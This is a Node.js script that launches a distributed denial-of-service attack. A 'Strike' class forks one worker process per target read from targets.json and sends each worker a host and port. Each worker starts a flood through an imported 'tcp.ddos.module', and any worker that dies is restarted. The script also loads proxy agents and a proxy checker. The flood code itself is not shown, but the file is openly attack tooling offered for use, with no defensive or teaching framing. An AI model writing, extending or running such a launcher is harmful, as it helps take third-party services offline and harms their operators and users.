const cron = require("node-cron");
const cluster = require("cluster");
const os = require("os");
const axios = require("axios");
const HttpsProxyAgent = require("https-proxy-agent");
const { SocksProxyAgent } = require("socks-proxy-agent");
const http = require("http");
const { Agent } = require("socks5-http-client");
const { socks5 } = require("./proxy.socks5");
const EventEmitter = require("events");
const ProxyChecker = require("./proxyChecker");
const TcpClient = require("./tcp.ddos.module");
const targets = require("./targets.json");

class Strike {
  #CPUsCount = 0;
  #ms = 1000;

  constructor(ms, CPUsCount) {
    this.counter = 0;
    this.eventEmitter = new EventEmitter();
    this.proxyChecker = new ProxyChecker();
    this.#ms = ms;
    this.#CPUsCount = CPUsCount;
  }

  async init() {
    const numCPUs = this.#CPUsCount || targets.data.length;
    let i = 0;

    if (cluster.isPrimary) {
      for (let i = 1; i <= numCPUs; i++) {
        this._fork();
      }

      for (const worker of Object.values(cluster.workers)) {
        const { host, port } = targets.data[i];
        worker.send({ host, port });
        // worker.send({ host: "127.0.0.1", port: 23 });
        i++;
      }

      cluster.on("exit", (worker, code, signal) => {
        console.error(`
          Worker died, id=${worker.id}, pid=${worker.process.pid}, signal=${signal}, code=${code}
        `);
        this._fork();
      });
    } else if (cluster.isWorker) {
      process.on("message", (data) => {
        const tcpClient = new TcpClient(data.host, data.port, this.#ms);
        tcpClient.init();
      });
      console.info("[Info]: Init instance, process id:", process.pid);
    }
  }

  _axiosRejectInterceptor() {
    axios.interceptors.response
      .use((response) => response, (error) => Promise.reject(error));
  }

  _fork() {
    const ENV = {
      NODE_OPTIONS: process.env.CHILD_NODE_OPTIONS,
    };
    cluster.fork(ENV);
  }

}

(function () {
  const [,, ms, CPUsCount] = process.argv;
  new Strike(ms, CPUsCount).init();
})();
